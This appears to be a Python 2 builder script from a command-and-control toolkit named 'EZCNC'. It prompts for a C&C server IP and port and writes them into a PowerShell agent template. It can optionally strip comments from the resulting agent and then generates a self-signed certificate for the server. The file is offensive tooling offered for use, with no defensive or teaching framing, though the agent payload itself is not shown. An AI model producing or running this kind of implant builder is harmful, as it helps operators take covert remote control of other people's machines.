import os

skeleton = 'template.ps1'
fileName = 'EZCNC-Agent-Del.ps1'
finalAgent = 'EZCNC-Agent.ps1'

print "[+] What is the IP Address of the Server"
ip = str(raw_input('')) 
print "[+] What is the Port you want to listen on"
port = str(raw_input())
print('[!] Server is ' + ip + ':' + port)

server = (ip+':'+port)

# Too Soon..
#print('[!] Agent Created and saved to ./AgentRequirements/' + fileName)

# Old line and New Line
old = '$ccserver = "192.168.9.4:80"'
new = '$ccserver = "' + server + '"'

# Delete old file
if os.path.exists('./AgentRequirements/' + fileName):
    os.remove('./AgentRequirements/' + fileName)
else:
    print('')

#os.remove('./AgentRequirements/' + fileName)
# open the skeleton .ps1 file and replace with user input of C&C Server
with open('./AgentRequirements/' + skeleton, 'r') as f:
    for line in f:
        line = line.replace(old, new)
        # Write to new .ps1 file
        i = open ('./AgentRequirements/' + fileName, 'a')
        i.write(line)
        i.close


###### ADD STRIP COMMENTS PART #######
while True:
    # Vriable for reading finalName 
    finalName = 'EZCNC-Agent-Del.ps1'
    s = open('./AgentRequirements/' + finalName, 'r').read()
    user_input = str(raw_input("[!] Do you wish to strip comments from final Agent File?" + '\n' + "[+] Type 'yes' or 'no'" + '\n'))

    print(user_input)

    if user_input.lower() == 'yes':
        print("[!] Commenting out File...")

        # Create Final Agent
        g = open('./AgentRequirements/' + finalAgent, "w")
        for line in s.splitlines():
            if not (line.startswith('#') or line.startswith('    #') or line.startswith('        #')):
                g.write(line + '\n')
        g.close()
        # New Agent created, so delete old agent
        os.remove('./AgentRequirements/' + finalName)

        print("[!] Agent created and located in ./AgentRequirements/" + finalAgent)
        break
    elif user_input.lower() == 'no':
        print("[!] Leaving comments...")
        # Rename old file to new agent
        os.rename('./AgentRequirements/' + fileName, './AgentRequirements/' + finalAgent)
        print("[!] Agent created and located in ./AgentRequirements/" + finalAgent)
        break
    else:
        print("[-] Invalid command.. try again")
        continue


print("[*] Generating Self-Signed Certificate...")

os.system("openssl req -new -x509 -keyout ./ServerRequirements/server-priv.key -out ./ServerRequirements/server.pem -days 365 -nodes -subj '/C=US' >/dev/null 2>&1")

print("[*] Certificate created and written to ./ServerRequirements/server.pem")
